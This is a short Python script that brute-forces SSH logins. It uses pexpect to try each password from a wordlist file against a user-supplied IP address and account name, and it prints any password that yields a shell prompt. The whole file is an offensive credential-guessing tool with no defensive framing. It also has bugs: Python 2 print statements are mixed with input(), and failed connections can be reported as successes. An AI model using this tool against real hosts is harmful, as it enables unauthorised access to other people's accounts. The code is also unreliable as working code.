#!/usr/bin/python

import pexpect
#password file name
filename = " "
PROMPT = ["# ", ">>> ", "> ", "\$ "]

def connect(user, host, password):
    ssh_newkey = "Are you sure you want to continue connecting?"
    connStr = "ssh " + user + "@" + host
    child = pexpect.spawn(connStr) 
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
    if ret  == 0:
        print "[-] Error Connecting"
        return
    if ret == 1:
        child.sendline("yes")
        ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])  
        if ret == 0:
            print "[-] Error Connecting"
            return
    child.sendline(password)
    child.expect(PROMPT,timeout=0.5)  
    return child

def main():
    host = input("Enter IP address to brute force: ")
    user = input("Enter user account to brute force: ")
    file = open(filename, 'r')
    for password in file.readlines():
        password = password.strip("\n")

        try:
            child = connect(user, host, password)
            print "[+] Password found: " + password
        except:
            print "[-] Wrong password: " + password
            
main()